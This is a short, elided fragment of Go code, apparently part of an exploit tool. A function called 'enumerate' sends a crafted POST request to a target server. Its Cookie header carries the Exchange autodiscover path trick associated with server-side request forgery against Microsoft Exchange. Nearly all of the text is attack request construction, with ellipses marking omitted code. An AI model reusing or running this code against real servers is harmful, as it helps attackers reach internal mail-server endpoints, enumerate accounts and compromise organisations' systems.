...
func enumerate(target string) {
   ...
   <soap:Body>
	...
	request, err := http.NewRequest(http.MethodPost, target+endpoint_addr, strings.NewReader(json_data))
	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("Cookie", "Email=autodiscover/autodiscover.json?a=test@test.com")
	request.Header.Add("User-Agent", user_agent)
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	request.Header.Add("Connection", "close")
